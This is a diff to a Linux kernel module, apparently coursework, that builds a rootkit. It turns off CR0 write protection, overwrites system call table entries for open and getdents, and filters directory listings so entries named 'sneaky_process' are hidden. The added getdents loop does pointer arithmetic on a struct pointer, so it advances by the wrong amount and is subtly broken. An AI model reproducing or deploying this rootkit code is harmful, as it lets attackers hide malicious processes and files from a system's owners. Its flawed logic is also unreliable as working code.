@@ -9,6 +9,16 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[1024];
+};
+
+
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -27,7 +37,17 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
+
+
+MODULE_LICENSE("ROOTKIT");
+MODULE_AUTHOR("TENG HU");
+
+
 static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;
+static int PID = 0;
+
+module_param(PID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+MODULE_PARM_DESC(PID, "An integer");
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
@@ -43,13 +63,43 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 
+
+
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
+
+
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
+  int nread = original_getdents(fd, dirp, count);
+  int remain = nread;
+  
+  while (remain > 0) {
+    remain -= dirp->d_reclen;
+    if (strstr(dirp->d_name, "sneaky_process") != NULL) {
+      nread -= dirp->d_reclen;
+      if (remain > 0) {
+	memmove(dirp, dirp + dirp->d_reclen, remain);
+      }
+    } else {    
+      dirp += dirp->d_reclen;      
+    }
+  }
+  return nread;
+}
+
+
+
+
+
+
+
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
-  struct page *page_ptr;
-
+  struct page *page_ptr;  
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "PID is  %d\n", PID);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -65,11 +115,18 @@ static int initialize_sneaky_module(void)
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+
+
+
+  original_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
+  
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-
   return 0;       // to show a successful load 
 }  
 
